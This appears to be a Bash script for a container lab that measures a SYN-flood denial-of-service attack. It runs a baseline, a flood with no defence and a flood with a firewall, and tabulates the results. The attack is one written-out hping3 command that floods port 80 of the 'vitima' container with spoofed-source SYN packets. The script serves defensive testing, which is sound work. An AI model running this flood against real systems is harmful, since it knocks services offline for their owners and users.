#!/usr/bin/env bash
set -euo pipefail

amostras="${1:-30}"
origem_falsa="10.99.99.99"

iniciar_ataque() {
    docker exec atacante timeout 180 hping3 -a "$origem_falsa" -S -p 80 --flood vitima >/dev/null 2>&1 &
}

parar_ataque() {
    docker exec atacante pkill hping3 >/dev/null 2>&1 || true
    wait 2>/dev/null || true
}

rm -f resultados/resultados.csv
bash defesa/firewall.sh off >/dev/null

echo ">> 1/3 baseline (sem ataque)"
bash medicao/medir.sh baseline "$amostras"

echo ">> 2/3 SYN flood sem defesa"
iniciar_ataque
sleep 4
bash medicao/medir.sh syn_flood_sem_defesa "$amostras"
parar_ataque

echo ">> 3/3 SYN flood com firewall"
bash defesa/firewall.sh on >/dev/null
iniciar_ataque
sleep 4
bash medicao/medir.sh syn_flood_com_firewall "$amostras"
parar_ataque
bash defesa/firewall.sh off >/dev/null

echo ">> Resultados"
column -s, -t resultados/resultados.csv
